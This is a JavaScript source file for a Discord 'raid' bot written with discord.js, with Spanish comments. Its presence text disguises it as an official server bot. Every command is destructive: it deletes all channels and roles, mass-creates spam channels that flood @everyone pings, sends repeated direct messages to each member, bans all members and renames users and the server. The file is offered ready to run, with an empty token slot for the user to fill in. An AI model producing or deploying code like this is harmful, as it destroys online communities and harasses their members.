const Discord = require("discord.js");
const client = new Discord.Client();

client.on("ready", () => {
  console.log(`Iniciando bot raid...`);
  console.log(`Cliente ${client.user.tag} listo para el raid!`);
  console.log("Bot creado por bluedool");
  console.log(`Comandos:
  .banall
  .nuke
  .raid
  .foto
  .mdall
  .roles
  .deleterole
  .nick (nombre)
  .list`);
  presencia();
});



function presencia() {
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "NeptuCraft - Bot oficial",
      type: "PROGRAMMING"

    }
  });
}

//nuke

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`#Raidporhpdycopiones`, {
      type: 'text'
    }).then(channel => {
      channel.send("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQyGV_5X-N21PjLGbRFITi5aehcerpM0Qw83zDuPMIWuGYmfhXjhh5TwPzCyU7fmqmcmM&usqp=CAU")
    })
  }
})

//raid

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.Raidporhpdycopiones') {
    for (let i = 0; i <= 1000; i++) {
      message.guild.channels.create(`Raid on Demon`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        channel.send("@everyone Raid on Demon ")
        
        


      })
    }
  }
});

//mdall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ".mdall")
    message.guild.members.cache.forEach(member => {
      setInterval(function() {
        member.send("RaidByDemon , https://www.youtube.com/watch?v=dQw4w9WgXcQ").catch(error => { });
      }, 450);
    })
});

//borar roles

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === ('.deleterole')) {
    message.guild.roles.cache.map(roles => roles.delete());
  }
});

//crear roles

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.roles') {
    for (let i = 0; i <= 200; i++) {
      message.guild.roles.create({ data: { name: `demon`, color: '#d41818', }, reason: 'razon', })
    };
  }
});

//foto y nombre

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.foto') {
    message.guild.setName("Demon");
    message.guild.setIcon("Demon"
    );
  }
});

//banall

client.on("message", message => {
  if (message.author.bot) return;

  if (message.content === '.banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
      m.ban()
    });
  }
});

//cambiar nombres

client.on("message", msg => {
  const args = msg.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.nick') {
    msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member => {
      i++
    }
    )
    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member => {

      member.setNickname(nickname)
    })
  }
});

//lista de sv

client.on("message", message => {
  if (message.author.bot) return;
  const args = message.content.slice().trim().split(/ +/g);
  const command = args.shift().toLowerCase();
  if (command === '.list') {
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle(message.guild.name)
      .setThumbnail()
      .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
      .setColor("RED");
    message.channel.send(embed)
  }
});


//Aca pones el token de tu bot
client.login("");

